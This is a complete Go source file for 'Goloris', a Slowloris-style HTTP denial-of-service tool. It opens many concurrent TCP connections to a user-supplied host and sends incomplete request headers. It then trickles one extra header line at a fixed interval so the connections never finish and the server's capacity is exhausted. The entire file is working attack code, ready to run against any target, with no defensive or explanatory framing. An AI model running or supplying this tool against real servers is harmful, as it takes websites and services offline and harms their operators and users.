package main

import (
	"fmt"
	"net"
	"bytes"
	"io"
	"time"
	"os"
	"os/signal"
	"strings"
	"flag"
	"log"
)

const (
	defaultUserAgent = "Goloris HTTP DoS"
)

// Command line options
var (
	numConnections int
	interval int
	method string
	resource string
	userAgent string
	target string
)

func main() {
	parseParams()
	if len(flag.Args()) == 0  {
		usage()
		os.Exit(-1)
	}

	signals := make(chan os.Signal, 1)

	target = flag.Args()[0]
	if !strings.Contains(target, ":") {
		target += ":80"
	}

	killchans := openConnections(target, numConnections)
	fmt.Printf("Opened %d/%d connections succesfully\n", len(killchans), numConnections)

	signal.Notify(signals, os.Interrupt, os.Kill)
	<-signals
	fmt.Printf("Received SIGKILL, killing connections...")

	for _, killchan := range killchans {
		killchan <- true
	}

	fmt.Printf("done\n")
}

func parseParams() {
	flag.IntVar(&numConnections, "connections", 10, "Number of active concurrent connections")
	flag.IntVar(&interval, "interval", 1, "Number of seconds to wait between sending headers")
	flag.StringVar(&method, "method", "GET", "HTTP method to user")
	flag.StringVar(&resource, "resource", "/", "Resource to request from the server")
	flag.StringVar(&userAgent, "useragent", defaultUserAgent, "User-Agent header of the request")
	flag.Parse()
}

func usage() {
	fmt.Println("")
	fmt.Println("usage: goloris [OPTIONS]... TARGET")
	fmt.Println("  TARGET host:port. port 80 is assumed if not defined")
	fmt.Println("")
	fmt.Println("OPTIONS")
	flag.PrintDefaults()
	fmt.Println("")
}

// Open given number of connections to target and return a chan slice that
// is used to kill the goroutines
func openConnections(target string, num int) []chan bool {
	killchans := make([]chan bool, 0)

	for i:=0; i<num; i++ {
		done := make(chan bool)
		errChan := make(chan error)

		go func() {
			conn, err := net.Dial("tcp", target)
			if err != nil {
				errChan <- err
				return
			} 
			defer conn.Close()

			errChan <- nil

			slowloris(target, interval, done, conn)
		}()

		err := <-errChan
		if err == nil{
			killchans = append(killchans, done)
		} else {
			log.Println(err)
		}
	}

	return killchans
}

func slowloris(target string, interval int, kill chan bool, conn net.Conn) error {
	// Send first headers
	host := target 
	headers := makeHeaders(host)
	req := createRequest(host, method, resource, headers)
	_, err := io.Copy(conn, req)
	if err != nil {
		return err
	}

	// Send a header every interval seconds, until an error occurs or 
	// a signal is sent through the kill channel
	loop:
	for {
		select {
		case <-kill:
			break loop

		case <-time.After(time.Duration(interval) * time.Second):
			_, err := conn.Write([]byte("Cookie: a=b\r\n"))
			if err != nil {
				log.Println(err)
			}
		}
	}

	return nil
}

func createRequest(host, method, resource string, headers map[string]string) *bytes.Buffer {
	buf := bytes.NewBuffer(make([]byte, 0))
	buf.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", method, resource))

	for header, value := range headers {
		buf.WriteString(fmt.Sprintf("%s: %s\r\n", header, value))
	}

	return buf
}

func makeHeaders(host string) map[string]string {
	headers := make(map[string]string)

	headers["Host"] = host
	headers["User-Agent"] = defaultUserAgent 
	headers["Content-Length"] = "42"

	return headers
}
